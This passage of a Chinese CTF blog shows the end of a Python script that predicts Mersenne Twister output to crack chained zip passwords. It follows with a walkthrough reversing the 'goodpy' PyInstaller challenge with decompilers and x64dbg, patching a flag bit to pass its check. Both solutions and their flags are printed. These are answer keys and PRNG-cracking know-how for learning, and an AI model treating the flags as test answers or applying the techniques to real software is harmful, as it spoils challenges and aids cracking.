class="number">3603223866</span>,<span class="number">3078033498</span>,<span class="number">1147648777</span>,<span class="number">3514932557</span>,<span class="number">2930781580</span>,<span class="number">984846570</span>,<span class="number">4212244974</span>,<span class="number">1020179629</span>,<span class="number">3382552365</span>,<span class="number">3588342390</span>,<span class="number">2485187463</span>,<span class="number">2828961807</span>,<span class="number">4136474278</span>,<span class="number">3551225472</span>,<span class="number">4086885006</span>,<span class="number">1310692642</span>,<span class="number">2241965503</span>,<span class="number">1504390196</span>,<span class="number">1603497325</span>,<span class="number">1455103646</span>,<span class="number">366434701</span>,<span class="number">293869916</span>,<span class="number">1550592307</span>,<span class="number">4214651425</span>,<span class="number">4250886934</span>,<span class="number">1306227123</span>,<span class="number">4036718626</span>,<span class="number">2933260006</span>,<span class="number">762182112</span>,<span class="number">1830993485</span>,<span class="number">2128141366</span>,<span class="number">44628368</span>,<span class="number">2873401036</span>,<span class="number">1257136753</span>,<span class="number">3380864990</span>,<span class="number">4275919402</span>,<span class="number">789867953</span>,<span class="number">3318150127</span>,<span class="number">487054724</span>,<span class="number">3730547753</span>,<span class="number">1936887664</span>,<span class="number">171225030</span>,<span class="number">3722592745</span>,<span class="number">1340948219</span>,<span class="number">1016521820</span>,<span class="number">1447577763</span>,<span class="number">2805353516</span>,<span class="number">1417994373</span>,<span class="number">817439704</span>,<span class="number">3813079978</span>,<span class="number">1200757040</span>,<span class="number">339005780</span>,<span class="number">4232371651</span>,<span class="number">1296406800</span>,<span class="number">805088113</span>,<span class="number">2812427961</span>,<span class="number">3875582523</span>,<span class="number">4113860721</span>,<span class="number">1947280914</span>,<span class="number">3775671015</span>,<span class="number">955163233</span>,<span class="number">3603928099</span>,<span class="number">91477649</span>,<span class="number">3287607536</span>,<span class="number">4201104916</span>,<span class="number">2491411596</span>,<span class="number">460805757</span>,<span class="number">1332051516</span>,<span class="number">3368474042</span>,<span class="number">3164283116</span>,<span class="number">2874896056</span>,<span class="number">293562372</span>,<span class="number">411629539</span>,<span class="number">2220832875</span>,<span class="number">2299167075</span>,<span class="number">2579299726</span>,<span class="number">2882735860</span>,<span class="number">2668845063</span>,<span class="number">42813252</span>,<span class="number">917639463</span>,<span class="number">2216449232</span>,<span class="number">2644803904</span>,<span class="number">2031826548</span>,<span class="number">3452099002</span>,<span class="number">1103665712</span>,<span class="number">1070395870</span>,<span class="number">532734790</span>,<span class="number">4097725963</span>,<span class="number">581033399</span>,<span class="number">963298035</span>,<span class="number">823792656</span>,<span class="number">3525861586</span>,<span class="number">20973404</span>,<span class="number">2359012004</span>,<span class="number">3432019008</span>,<span class="number">2233316197</span>,<span class="number">697890212</span>,<span class="number">3568807990</span>,<span class="number">3652343610</span>,<span class="number">1398136840</span>,<span class="number">937985297</span>,<span class="number">2581792527</span>,<span class="number">2566945713</span>,<span class="number">1386694986</span>,<span class="number">2557383413</span>,<span class="number">1945328836</span>,<span class="number">1021712351</span>,<span class="number">3289407095</span>,<span class="number">2323689998</span>,<span class="number">3306271310</span>,<span class="number">3585440682</span>,<span class="number">1855892766</span>,<span class="number">2796595085</span>,<span class="number">2504479613</span>,<span class="number">1289850575</span>,<span class="number">2929745242</span>,<span class="number">2021810381</span>,<span class="number">3242210155</span>,<span class="number">3055960700</span>,<span class="number">365068549</span>,<span class="number">2513400611</span>,<span class="number">553638319</span>,<span class="number">3920510223</span>,<span class="number">2495696848</span>,<span class="number">1824819128</span>,<span class="number">1213008255</span>,<span class="number">4189990551</span>,<span class="number">1989970719</span>,<span class="number">1031033434</span>,<span class="number">531275736</span>,<span class="number">882122649</span>,<span class="number">1721700980</span>,<span class="number">3178163802</span>,<span class="number">3700771996</span>,<span class="number">1850869451</span>,<span class="number">3206165832</span>,<span class="number">1272158460</span>,<span class="number">3303927391</span>,<span class="number">4119824836</span>,<span class="number">3968831781</span>,<span class="number">3771252104</span>,<span class="number">1674478394</span>,<span class="number">530327252</span>,<span class="number">9184370</span>,<span class="number">2681387057</span>,<span class="number">1178553319</span>,<span class="number">1950066334</span>,<span class="number">3127696976</span>,<span class="number">2661749414</span>,<span class="number">1383174577</span>,<span class="number">4201508029</span>]</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">while True:</span><br><span class="line">    password = randcrack(nums[-<span class="number">624</span>:])</span><br><span class="line">    print(&quot;password:&#123;&#125;&quot;.format(password))</span><br><span class="line">    nums.append(int(password))</span><br><span class="line">    os.rename(&quot;unknown.zip&quot;,str(password)+&quot;.zip&quot;)</span><br><span class="line">    name = getname()</span><br><span class="line">    if name:</span><br><span class="line">        print(&quot;name &#123;&#125;&quot;.format(name))</span><br><span class="line">        zip_file = zipfile.ZipFile(name)</span><br><span class="line">        zip_list = zip_file.namelist()</span><br><span class="line">        for f in zip_list:</span><br><span class="line">            zip_file.extract(f, r&#x27;./&#x27;, pwd=str(password).encode(&quot;utf-<span class="number">8</span>&quot;))  </span><br><span class="line">        zip_file.close()</span><br><span class="line">        os.remove(name)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        print(&quot;count = &quot;,count,&quot;name = &quot;,name)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;end or something wrong&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">#flag&#123;R@nd0m_Not_5ec&#125;</span><br></pre></td></tr></table></figure>



<h2 id="0x05-goodpy"><a href="#0x05-goodpy" class="headerlink" title="0x05 goodpy"></a>0x05 goodpy</h2><p>pyinstaller打包的exe首先 pyinstxtractor.py，网上很容易找，解包后看到一堆文件。本来猜测主程序是pyc,pyo可以反编译，但是不是。只有一些pyd长得像主程序。</p>
<p>看到叶子姐的wp首先把pyc python magic的12字节写成了16字节（python3.8+???)才去uncomplie6？？？这里没太明白是因为什么的版本问题不太一样？我直接就解出来了，环境python3.7.</p>
<p>uncompile6会显示可能的entry,有个test.pyc，去看看：</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Embedded file name: test.py</span></span><br><span class="line"><span class="keyword">import</span> goodpy</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(goodpy.pypypy())</span><br><span class="line"><span class="comment"># okay decompiling test.pyc</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主程序是 goodpy.cp37-win_amd64.pyd ，可以grep -Rn pypypy 找，只有他了。</p>
<p>进入之后搜索字符串，可以看到try again等判断字符串，交叉引用来到来到.data段,可以看到很多字符串信息：</p>
<p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630027084667.png" alt="1630027084667"></p>
<p>并且都以</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00000001800098A8</span>                 dq offset aGoodgoodgoodgo ; <span class="string">&quot;goodgoodgoodgoodgoodgoodgoodgoodgood!!&quot;</span></span><br><span class="line">.data:<span class="number">00000001800098B0</span>                 dq 27h</span><br><span class="line">.data:<span class="number">00000001800098B8</span>                 dq <span class="number">0</span></span><br><span class="line">.data:<span class="number">00000001800098C0</span>                 dq 100h</span><br><span class="line">.data:<span class="number">00000001800098C8</span>                 dq offset qword_18000A808</span><br></pre></td></tr></table></figure>

<p>这样的结构体出现，可能和python变量存储为对有相关。</p>
<p>然后可以找到调用的pypypy函数，sub_180006600</p>
<p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630028032294.png" alt="1630028032294"></p>
<p>这也是很多字符串对象结构体中唯一一个有sub函数指向的，下面这个qword_180009740就是Py初始化函数用的。</p>
<p>jmp来到6600，jmp180005A10，发现一个地方获取了这个对象东西的size大小，并且还有个38的判断，很可能和输入长度有关。</p>
<p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630029023087.png" alt="1630029023087"></p>
<p>再看v34，是一个函数在call之后的结果，两个参数未知数据，需要动调。</p>
<p>运行goodpy.exe，x64dbg attach之后，全部字符串搜索38，找到cmp rax,0x26的地方下断点。（重新运行就断不住了，我还是关了重新attach）</p>
<p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630031296719.png" alt="1630031296719"></p>
<p>判断成功后直接走到如下图地方：加载goodgood字符串。</p>
<p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630116416278.png" alt="1630116416278"></p>
<p>走完下面3A00函数后如下所示寄存器：</p>
<p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630116506657.png" alt="1630116506657"></p>
<p>进入0x26次循环、</p>
<p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630033088507.png" alt="1630033088507"></p>
<p>这中间有很多判断和数据加载过程，对应着python各种数据格式。同时也能看到PyObjectXor和PyObject_RichComapre函数使用。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PyObject* PyNumber_Xor(PyObject *o1, PyObject *o2)</span><br><span class="line"><span class="keyword">Return</span> <span class="keyword">value</span>: <span class="built_in">New</span> reference.</span><br><span class="line"><span class="keyword">Returns</span> the “bitwise <span class="keyword">exclusive</span> <span class="keyword">or</span>” <span class="keyword">of</span> o1 <span class="keyword">by</span> o2 <span class="keyword">on</span> success, <span class="keyword">or</span> <span class="keyword">NULL</span> <span class="keyword">on</span> failure. This <span class="keyword">is</span> the equivalent <span class="keyword">of</span> the Python expression o1 ^ o2.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PyObject* PyObject_RichCompare(PyObject *o1, PyObject *o2, <span class="type">int</span> opid)</span><br><span class="line"><span class="keyword">Return</span> <span class="keyword">value</span>: <span class="built_in">New</span> reference.</span><br><span class="line">Compare the <span class="keyword">values</span> <span class="keyword">of</span> o1 <span class="keyword">and</span> o2 <span class="keyword">using</span> the operation specified <span class="keyword">by</span> opid, which must be one <span class="keyword">of</span> Py_LT, Py_LE, Py_EQ, Py_NE, Py_GT, <span class="keyword">or</span> Py_GE, corresponding <span class="keyword">to</span> &lt;, &lt;=, ==, !=, &gt;, <span class="keyword">or</span> &gt;= respectively. This <span class="keyword">is</span> the equivalent <span class="keyword">of</span> the Python expression o1 op o2, <span class="keyword">where</span> op <span class="keyword">is</span> the <span class="keyword">operator</span> corresponding <span class="keyword">to</span> opid. <span class="keyword">Returns</span> the <span class="keyword">value</span> <span class="keyword">of</span> the comparison <span class="keyword">on</span> success, <span class="keyword">or</span> <span class="keyword">NULL</span> <span class="keyword">on</span> failure.</span><br></pre></td></tr></table></figure>

<p>下断点在xor,formlong,cmp处看一下数据，过程中发现</p>
<p>走到xor函数时的参数中，RDI的pyobject结构体第4个数据是用来异或的，RSI是good字符串循环加载，异或结果与输入比较，对了就接着往下走。或者直接走到cmp函数那里，如下图所示，每次改一下RDI寄存器（自己输入），重复多次即可,这里发现直接改rdi后者rsi的pyobject地址是无法改变判断跳转的，会出错，找到每次正确的判断控制流为：</p>
<p>6186不跳</p>
<p>6190跳</p>
<p>61a3跳</p>
<p>61dd跳</p>
<p>61ee不跳</p>
<p>61f8跳</p>
<p>以上都一样。6207大跳,需要设置断点改一下标志位ZF，输入错误时。</p>
<p>62e8控制0x26循环不会跳的</p>
<p>62f9跳回</p>
<p>改一下判断位保证后续。</p>
<p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630117534281.png" alt="1630117534281"></p>
<p>最终结果：</p>
<p>flag{09d11443a4304a6881718c7023d226de}</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"># CTF</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
            </div>
            <div class="post-nav-item">
                <a href="/2021/09/07/hexoBlogBuild/" rel="next" title="Hexo博客搭建详细教程 一文通">
                  Hexo博客搭建详细教程 一文通 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">L3m0nade</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">42k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">51 分钟</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.5.0/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>

  




  


  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"NPigmrkYkDL0KfJ6TX2RobnC-gzGzoHsz","app_key":"2ArifcHInY7OfyMnohWSW1hb","server_url":"https://npigmrky.lc-cn-n1-shared.com","security":false}</script>
  <script src="/js/third-party/statistics/lean-analytics.js"></script>



</body>
</html>
